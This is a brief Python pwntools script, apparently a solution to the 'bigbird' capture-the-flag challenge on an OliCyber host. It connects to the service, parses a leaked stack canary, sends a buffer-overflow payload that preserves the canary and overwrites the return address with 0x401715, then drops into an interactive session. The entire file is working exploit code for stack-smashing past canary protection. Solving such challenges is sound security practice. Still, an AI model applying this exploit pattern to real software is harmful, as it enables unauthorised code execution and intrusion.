from pwn import *

URL="bigbird.challs.olicyber.it"
r=remote(URL,12006)
r.recvuntil("0x")
canary=p64(int(r.recvuntil("\n",drop=True),16))
print(canary)
payload=b'A'*40+canary+b'B'*8+p64(0x401715)
r.sendline(payload)
r.interactive()